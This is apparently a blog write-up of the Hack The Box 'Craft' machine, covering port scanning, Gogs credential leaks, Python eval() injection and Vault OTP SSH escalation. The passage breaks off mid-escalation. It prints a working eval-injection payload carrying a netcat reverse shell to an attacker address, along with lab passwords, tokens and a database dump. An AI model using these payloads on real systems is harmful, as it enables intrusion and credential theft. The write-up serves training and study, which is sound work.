I"9ä<h1 id="enumeration">Enumeration</h1>
<h2 id="masscan--nmap">Masscan + Nmap</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>masscan <span class="nt">-p1-65535</span>,U:1-65535 IP <span class="nt">--rate</span><span class="o">=</span>10000 <span class="nt">-e</span> tun0 | <span class="nb">tee </span>masscan.out
Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2021-07-12 17:00:33 GMT
 <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
Initiating SYN Stealth Scan
Scanning 1 hosts <span class="o">[</span>131070 ports/host]
Discovered open port 6022/tcp on 10.10.10.110
Discovered open port 443/tcp on 10.10.10.110
Discovered open port 22/tcp on 10.10.10.110
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Parse those ports to nmap:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre><span class="nv">$ ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>masscan.out |awk <span class="s1">'{ print $4 }'</span> | <span class="nb">sed</span> <span class="s1">'s/\/tcp//;s/\/udp//'</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed</span> <span class="s1">'s/,$//'</span><span class="si">)</span>
<span class="nv">$ </span>nmap <span class="nt">-sVC</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-p</span> <span class="nv">$ports</span> IP <span class="nt">-oN</span> nmap-fullscan.out
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 <span class="o">(</span>RSA<span class="o">)</span>
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 <span class="o">(</span>ED25519<span class="o">)</span>
443/tcp  open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: 404 Not Found
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>craft.htb/organizationName<span class="o">=</span>Craft/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
6022/tcp open  ssh      <span class="o">(</span>protocol 2.0<span class="o">)</span>
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-Go
| ssh-hostkey:
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb <span class="o">(</span>RSA<span class="o">)</span>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6022-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>7/12%Time<span class="o">=</span>60EC759D%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NU
SF:LL,C,<span class="s2">"SSH-2</span><span class="se">\.</span><span class="s2">0-Go</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>47.00 seconds
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Added craft.htb to /etc/hosts.</p>
<h1 id="foothold">Foothold</h1>
<h2 id="crafthtb">craft.htb</h2>
<p>Contains not much, but two buttons redirecting to api.craft.htb and gogs.craft.htb. Added them to /etc/hosts as well.
<img src="/assets/img/Posts/Craft/craft-1.png" alt="/assets/img/Posts/Craft/craft-1.png" /></p>

<h2 id="gogscrafthtb">gogs.craft.htb</h2>
<p>There is a repository at /Craft/craft-api named craft-api which I downloaded.
<img src="/assets/img/Posts/Craft/craft-2.png" alt="/assets/img/Posts/Craft/craft-2.png" /></p>
<h3 id="eval-in-brew">eval in brew</h3>
<p><code class="language-plaintext highlighter-rouge">craft_api/api/brew/endpoints</code> has a commit named  <em>‚ÄúAdd fix for bogus ABV values‚Äù</em></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>    <span class="o">@</span><span class="n">auth</span><span class="p">.</span><span class="n">auth_required</span>
    <span class="o">@</span><span class="n">api</span><span class="p">.</span><span class="n">expect</span><span class="p">(</span><span class="n">beer_entry</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">post</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="s">"""
        Creates a new brew entry.
        """</span>

        <span class="c1"># make sure the ABV value is sane.
</span>        <span class="k">if</span> <span class="nb">eval</span><span class="p">(</span><span class="s">'%s &gt; 1'</span> <span class="o">%</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">[</span><span class="s">'abv'</span><span class="p">]):</span>
            <span class="k">return</span> <span class="s">"ABV must be a decimal value less than 1.0"</span><span class="p">,</span> <span class="mi">400</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">create_brew</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">)</span>
            <span class="k">return</span> <span class="bp">None</span><span class="p">,</span> <span class="mi">201</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>/Craft/craft-api/issues/2 mentions why the eval function was included, they didn‚Äôt want values above than 1.0 so they added another commit which uses eval function to check if the value is below 1.0</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-H</span> <span class="s1">'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw'</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-k</span> <span class="nt">-X</span> POST https://api.craft.htb/api/brew/ <span class="nt">--data</span> <span class="s1">'{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>But we don‚Äôt have an authorization token, and that can only be created with /auth/login api in api.craft.htb with some valid credentials.</p>
<h3 id="cleanup-test-commit-contains-creds">Cleanup test commit contains creds</h3>
<p>Creds: <code class="language-plaintext highlighter-rouge">dinesh:4aUh0A8PbVJxgd</code>
<img src="/assets/img/Posts/Craft/craft-3.png" alt="/assets/img/Posts/Craft/craft-3.png" /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="o">-</span><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/auth/login'</span><span class="p">,</span>  <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s">'dinesh'</span><span class="p">,</span> <span class="s">'4aUh0A8PbVJxgd'</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="o">+</span><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/auth/login'</span><span class="p">,</span>  <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s">''</span><span class="p">,</span> <span class="s">''</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<h2 id="apicrafthtb">api.craft.htb</h2>
<p>/auth/login - Create an authentication token provided valid username and password</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-X</span> GET <span class="s2">"https://dinesh:4aUh0A8PbVJxgd@api.craft.htb/api/auth/login"</span> <span class="nt">-H</span>  <span class="s2">"accept: application/json"</span> <span class="nt">-k</span>
<span class="o">{</span><span class="s2">"token"</span>:<span class="s2">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNjI2MTk3NDMwfQ.D2ooUakzD-ZPAZXa-wKPpKfxJfqBrv3cDgA32SNSm4g"</span><span class="o">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>/auth/check - Checks validity of an authorization token (Also the header X-Craft-API-Token is taken from test.py)</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-X</span> GET <span class="s2">"https://api.craft.htb/api/auth/check"</span> <span class="nt">-H</span>  <span class="s2">"accept: application/json"</span> <span class="nt">-H</span> <span class="s2">"X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNjI2MTk3ODY0fQ.TjJVzsdRPWvTyZMWrQ0GmO9Q0FaPGZ8RVOoDiuW0XGc"</span> <span class="nt">-k</span>
<span class="o">{</span><span class="s2">"message"</span>:<span class="s2">"Token is valid!"</span><span class="o">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<h2 id="getting-docker-shell-with-brew-eval">Getting docker shell with brew eval</h2>
<p>Code from test.py tries to make a sample brew with ABV values so I added the valid credentials in test.py.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/auth/login'</span><span class="p">,</span>  <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s">'dinesh'</span><span class="p">,</span> <span class="s">'4aUh0A8PbVJxgd'</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="n">json_response</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
<span class="n">token</span> <span class="o">=</span>  <span class="n">json_response</span><span class="p">[</span><span class="s">'token'</span><span class="p">]</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s">'X-Craft-API-Token'</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span>  <span class="p">}</span>

<span class="c1"># make sure token is valid
</span><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/auth/check'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

<span class="c1"># create a sample brew with bogus ABV... should fail.
</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Create bogus ABV brew"</span><span class="p">)</span>
<span class="n">brew_dict</span> <span class="o">=</span> <span class="p">{}</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'abv'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'15.0'</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit'</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'brewer'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit'</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'style'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit'</span>

<span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">brew_dict</span><span class="p">)</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/brew/'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json_data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>


<span class="c1"># create a sample brew with real ABV... should succeed.
</span><span class="k">print</span><span class="p">(</span><span class="s">"Create real ABV brew"</span><span class="p">)</span>
<span class="n">brew_dict</span> <span class="o">=</span> <span class="p">{}</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'abv'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'0.15'</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit'</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'brewer'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit'</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'style'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit'</span>

<span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">brew_dict</span><span class="p">)</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/brew/'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json_data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Running test.py:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">python</span> <span class="n">test</span><span class="p">.</span><span class="n">py</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
<span class="p">{</span><span class="s">"message"</span><span class="p">:</span><span class="s">"Token is valid!"</span><span class="p">}</span>

<span class="n">Create</span> <span class="n">bogus</span> <span class="n">ABV</span> <span class="n">brew</span>
<span class="s">"ABV must be a decimal value less than 1.0"</span>

<span class="n">Create</span> <span class="n">real</span> <span class="n">ABV</span> <span class="n">brew</span>
<span class="n">null</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Testing to bypass python eval function:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
</span><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">subprocess</span>

<span class="n">abv</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="k">if</span> <span class="nb">eval</span><span class="p">(</span><span class="s">'%s &gt; 1'</span> <span class="o">%</span> <span class="n">abv</span><span class="p">):</span>
	<span class="k">print</span> <span class="s">"ABV must be a decimal value less than 1.0"</span>
<span class="k">else</span><span class="p">:</span>
	<span class="k">print</span> <span class="s">"Successfull"</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python temp.py <span class="s2">"__import__('os').system('whoami')"</span>
root
Successfull
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Modify test.py with the new ABV values, which is:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">brew_dict</span><span class="p">[</span><span class="s">'abv'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.11 4444 &gt;/tmp/f")'</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Running test.py:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python test.py 2&gt;/dev/null
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNjI2MTk5MjcxfQ.uIy4vpjs_NAvPdSiaf2jLe-7FHAcEvnbGs7rLx9zVUk
<span class="o">{</span><span class="s2">"message"</span>:<span class="s2">"Token is valid!"</span><span class="o">}</span>

Create malicious ABV brew
</pre></td></tr></tbody></table></code></pre></div></div>
<p>and I got a shell.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>rlwrap nc <span class="nt">-lnvp</span> 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.110 44791
/bin/sh: can<span class="s1">'t access tty; job control turned off
/opt/app # 
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p>settings.py contains valid MySQL credentials:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>/opt/app/craft_api <span class="c"># cat settings.py</span>
<span class="c"># Flask settings</span>
FLASK_SERVER_NAME <span class="o">=</span> <span class="s1">'api.craft.htb'</span>
FLASK_DEBUG <span class="o">=</span> False  <span class="c"># Do not use debug mode in production</span>

<span class="c"># Flask-Restplus settings</span>
RESTPLUS_SWAGGER_UI_DOC_EXPANSION <span class="o">=</span> <span class="s1">'list'</span>
RESTPLUS_VALIDATE <span class="o">=</span> True
RESTPLUS_MASK_SWAGGER <span class="o">=</span> False
RESTPLUS_ERROR_404_HELP <span class="o">=</span> False
CRAFT_API_SECRET <span class="o">=</span> <span class="s1">'hz66OCkDtv8G6D'</span>

<span class="c"># database</span>
MYSQL_DATABASE_USER <span class="o">=</span> <span class="s1">'craft'</span>
MYSQL_DATABASE_PASSWORD <span class="o">=</span> <span class="s1">'qLGockJ6G2J75O'</span>
MYSQL_DATABASE_DB <span class="o">=</span> <span class="s1">'craft'</span>
MYSQL_DATABASE_HOST <span class="o">=</span> <span class="s1">'db'</span>
SQLALCHEMY_TRACK_MODIFICATIONS <span class="o">=</span> False
</pre></td></tr></tbody></table></code></pre></div></div>
<p>netstat output says MySQL is running on port 44563:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>netstat <span class="nt">-tulpn</span>
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.11:44563        0.0.0.0:<span class="k">*</span>               LISTEN      -
tcp        0      0 0.0.0.0:8888            0.0.0.0:<span class="k">*</span>               LISTEN      1/python
udp        0      0 127.0.0.11:40244        0.0.0.0:<span class="k">*</span>                           -
</pre></td></tr></tbody></table></code></pre></div></div>
<p>There‚Äôs a dbtest.py:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">pymysql</span>
<span class="kn">from</span> <span class="nn">craft_api</span> <span class="kn">import</span> <span class="n">settings</span>

<span class="c1"># test connection to mysql database
</span>
<span class="n">connection</span> <span class="o">=</span> <span class="n">pymysql</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_HOST</span><span class="p">,</span>
                             <span class="n">user</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_USER</span><span class="p">,</span>
                             <span class="n">password</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_PASSWORD</span><span class="p">,</span>
                             <span class="n">db</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_DB</span><span class="p">,</span>
                             <span class="n">cursorclass</span><span class="o">=</span><span class="n">pymysql</span><span class="p">.</span><span class="n">cursors</span><span class="p">.</span><span class="n">DictCursor</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="k">with</span> <span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
        <span class="n">sql</span> <span class="o">=</span> <span class="s">"SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"</span>
        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchone</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

<span class="k">finally</span><span class="p">:</span>
    <span class="n">connection</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Running it gives:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>python dbtest.py
<span class="o">{</span><span class="s1">'id'</span>: 12, <span class="s1">'brewer'</span>: <span class="s1">'10 Barrel Brewing Company'</span>, <span class="s1">'name'</span>: <span class="s1">'Pub Beer'</span>, <span class="s1">'abv'</span>: Decimal<span class="o">(</span><span class="s1">'0.050'</span><span class="o">)}</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Use  <code class="language-plaintext highlighter-rouge">sql = "show tables;"</code> it gives <code class="language-plaintext highlighter-rouge">brew</code> and <code class="language-plaintext highlighter-rouge">user</code> as a table and change fetchone() to fetchall(). 
Use <code class="language-plaintext highlighter-rouge">sql = "SELECT * from user;"</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>python dbtest.py
<span class="o">[{</span><span class="s1">'id'</span>: 1, <span class="s1">'username'</span>: <span class="s1">'dinesh'</span>, <span class="s1">'password'</span>: <span class="s1">'4aUh0A8PbVJxgd'</span><span class="o">}</span>, <span class="o">{</span><span class="s1">'id'</span>: 4, <span class="s1">'username'</span>: <span class="s1">'ebachman'</span>, <span class="s1">'password'</span>: <span class="s1">'llJ77D8QFkLPQB'</span><span class="o">}</span>, <span class="o">{</span><span class="s1">'id'</span>: 5, <span class="s1">'username'</span>: <span class="s1">'gilfoyle'</span>, <span class="s1">'password'</span>: <span class="s1">'ZEU3N8WNM2rh4T'</span><span class="o">}]</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<h2 id="getting-user-shell-as-gilfoyle">Getting user shell as gilfoyle</h2>
<p>Creds from MySQL database can pass login in gogs.craft.htb and we‚Äôve a repo called craft-infra which has a .ssh folder.
<img src="/assets/img/Posts/Craft/craft-4.png" alt="/assets/img/Posts/Craft/craft-4.png" />
Provided password for gilfoyle as passphrase for id_rsa too.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre>ssh <span class="nt">-i</span> id_rsa gilfoyle@craft.htb


  <span class="nb">.</span>   <span class="k">*</span>   ..  <span class="nb">.</span> <span class="k">*</span>  <span class="k">*</span>
<span class="k">*</span>  <span class="k">*</span> @<span class="o">()</span>Ooc<span class="o">()</span><span class="k">*</span>   o  <span class="nb">.</span>
    <span class="o">(</span>Q@<span class="k">*</span>0CG<span class="k">*</span>O<span class="o">()</span>  ___
   |<span class="se">\_</span>________/|/ _ <span class="se">\</span>
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | <span class="se">\_</span>| |
   |  |  |  |  |<span class="se">\_</span>__/
   |<span class="se">\_</span>|__|__|_/|
    <span class="se">\_</span>________/



Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>:
Linux craft.htb 4.9.0-8-amd64 <span class="c">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jul 12 12:52:17 2021 from 10.10.14.11
gilfoyle@craft:~<span class="err">$</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<h1 id="privesc">Privesc</h1>
<p>gogs.craft.htb contains a vault folder with a secret.sh
<img src="/assets/img/Posts/Craft/craft-5.png" alt="/assets/img/Posts/Craft/craft-5.png" />
Which mentions enabling secrets for ssh,writes key-type as otp and user as root at ssh/roles/root_otp
Also home folder of gilfoyle contains a .vault-token file with a token.</p>
<blockquote>
  <p><em>‚ÄúVault - Manage Secrets and Protect Sensitive Data
Secure, store and tightly control access to tokens, passwords, certificates, encryption keys for protecting secrets and other sensitive data using a UI, CLI, or HTTP API.‚Äù</em></p>
</blockquote>

<p>Vault also has a ssh option, and it generates OTP for the session as a password.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre></td><td class="rouge-code"><pre>gilfoyle@craft:/<span class="nv">$ </span>vault ssh <span class="nt">-mode</span><span class="o">=</span>otp  root@localhost
WARNING: No <span class="nt">-role</span> specified. Use <span class="nt">-role</span> to tell Vault which ssh role to use <span class="k">for
</span>authentication. In the future, you will need to tell Vault which role to use.
For now, Vault will attempt to guess based on the API response. This will be
removed <span class="k">in </span>the Vault 1.1.
Vault SSH: Role: <span class="s2">"root_otp"</span>
Vault could not locate <span class="s2">"sshpass"</span><span class="nb">.</span> The OTP code <span class="k">for </span>the session is displayed
